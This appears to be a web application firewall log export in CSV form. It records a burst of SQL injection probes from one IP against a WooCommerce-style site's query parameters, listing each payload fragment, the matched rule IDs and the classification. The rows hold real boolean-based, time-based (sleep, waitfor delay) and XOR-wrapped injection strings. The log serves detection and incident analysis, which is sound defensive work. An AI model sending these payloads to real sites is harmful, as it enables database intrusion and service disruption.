timestamp_utc,txid,source_ip,host,user_agent,method,path,payload_location,parameter_or_scope,payload_family,normalised_fragment,waf_rule_ids,waf_detection,waf_action_evidence,response_status,duration_ms,signal_classification,scenario_outcome,evidence_boundary
2025-07-28T02:25:50+00:00,aIbfrJBpFs9rtljRmvgarwAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,boolean_based_sqli,-1' OR 5*5=25 or '1sboGrot'=',942100,Confirmed,Not observed,301,1237.640,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:25:51+00:00,aIbfrZVBsaOcgKzP83rEPAAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,boolean_based_sqli,-1\x22 OR 5*5=25 or \x22dZrCt8LS\x22=\x22,942100,Confirmed,Not observed,404,1279.830,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:25:51+00:00,aIbfrgUA0eMD2lcHYtGmdwAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,boolean_based_sqli,-1\x22 OR 5*5=25 or \x22r4olnyvI\x22=\x22,942100,Confirmed,Not observed,301,1134.472,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:25:52+00:00,aIbfrwUA0eMD2lcHYtGmeAAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,boolean_based_sqli,-1\x22 OR 5*5=26 or \x22dZrCt8LS\x22=\x22,942100,Confirmed,Not observed,404,1317.166,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:25:56+00:00,aIbfs7ZhckEallvc9NWoxgAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,time_based_sqli,"1*if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,301,1079.889,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:03+00:00,aIbfuvJCXCQleSJdGySrBAAAABY,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:orderby,time_based_sqli,"if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,301,1111.825,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:07+00:00,aIbfvlQZ0ONdC7GFi-7XJAAAAAY,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,time_based_sqli,"1*if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,301,1023.271,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:08+00:00,aIbfv5VBsaOcgKzP83rESQAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,time_based_sqli,"if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,404,1136.147,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:21+00:00,aIbfzJBpFs9rtljRmvgaxwAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:orderby,time_based_sqli,"popularity0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,301,981.470,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:29+00:00,aIbf1D4z9bXgCPEEEhtBGwAAABk,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,time_based_sqli,"agvago0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,404,1121.947,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:44+00:00,aIbf4@FjcidBO-ES5N6AoAAAABA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:orderby,time_based_sqli,"popularity0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,301,959.196,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:52+00:00,aIbf65BpFs9rtljRmvga0gAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,time_based_sqli,"agvago0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,404,1083.139,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:55+00:00,aIbf7zePAjiXWfJyflUlkAAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,57.399,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:57+00:00,aIbf8TePAjiXWfJyflUlkQAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:post_type,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,60.620,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:26:58+00:00,aIbf8pBpFs9rtljRmvga1AAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:post_type,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,53.859,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:02+00:00,aIbf9lTndFvwO@Nr92jucgAAAAk,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:orderby,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,55.272,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:03+00:00,aIbf97ZhckEallvc9NWo5gAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:post_type,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,55.262,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:07+00:00,aIbf@-JCXCQleSJdGySrMAAAABY,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,55.807,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:07+00:00,aIbf@7KQCm5bWDnak54qhAAAABM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:product_cat,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,102.946,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:09+00:00,aIbf-EUamHw1CKbE4TXs9AAAAB0,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,other_sqli_pattern,1-1; waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,978.473,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:14+00:00,aIbgAmr5O0a6lYef7RQZhwAAAAs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:post_type,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,56.616,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:16+00:00,aIbgBD4IPTLxBnOxY7J7rQAAABQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/,query_string,ARGS:wc-ajax,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,57.704,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:16+00:00,aIbgBAUA0eMD2lcHYtGmmgAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:post_type,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,56.237,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:17+00:00,aIbgBOFjcidBO-ES5N6AqQAAABA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:orderby,other_sqli_pattern,popularity-1 waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,956.144,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:20+00:00,aIbgCAUA0eMD2lcHYtGmmwAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/,query_string,ARGS:wc-ajax,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,56.976,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T02:27:21+00:00,aIbgCK4D0j5rRy@@@s9cSgAAAAY,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/,query_string,ARGS:paged,other_sqli_pattern,1-1; waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,945.990,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
